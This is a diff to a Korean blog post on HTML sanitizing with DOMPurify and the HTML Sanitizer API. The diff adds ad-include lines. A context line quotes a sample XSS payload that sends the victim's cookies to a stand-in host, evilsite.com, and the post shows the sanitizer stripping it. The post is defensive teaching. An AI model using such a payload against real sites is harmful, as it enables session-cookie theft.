@@ -36,6 +36,8 @@ categories: web
 ```
 Sanitizer (여기서는 DOMPurify를 실행한 결과입니다)가 `<script>` 태그를 인식하고, 아예 삭제해 버렸습니다. XSS의 기법은 여러 가지가 있기 때문에 `javascript:`으로 시작하는 URL, `onload`와 같은 event listener 등 고려할 점이 많습니다. 보통은 [DOMPurify](https://github.com/cure53/DOMPurify)와 같은 라이브러리를 사용하는 것이 편하고 안전합니다.
 
+{% include ad.html %}
+
 # HTML Sanitizing API란?
 
 클라이언트 측에서 (당연한 얘기지만, 서버 측에서도 다시 sanitize 해줘야 됩니다! 해커가 콘솔에서 POST 요청을 직접 보낼 수도 있으니까요!) Sanitize를 할 때는 라이브러리를 사용하는 것이 일반적입니다. 그러나 이렇게 되면 로딩이 더 길어지고 사이트가 더 무거워진다는 단점이 있습니다.
@@ -81,6 +83,8 @@ input:  xss <script>window.open("http://evilsite.com/cookies.php?cookie="+Encode
 output: xss  test
 ```
 잘 동작하네요!
+
+{% include ad.html %}
 
 ## 3. 소스코드
 
